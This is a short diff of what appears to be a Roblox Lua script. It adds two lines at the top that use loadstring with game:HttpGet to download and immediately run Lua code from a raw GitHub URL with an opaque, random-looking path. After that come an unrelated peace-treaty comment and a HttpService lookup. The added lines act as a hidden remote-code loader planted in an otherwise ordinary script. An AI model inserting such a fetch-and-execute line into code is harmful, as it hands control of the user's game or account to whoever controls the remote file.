@@ -1,3 +1,5 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/mabdu21/2askdkn21h3u21ddaa/refs/heads/main/djajuu1yhka.lua'))()
+task.wait(0.5)
 -- If you don't raid us first, we won't raid you. Let's live in peace
 
 local HttpService = game:GetService("HttpService")
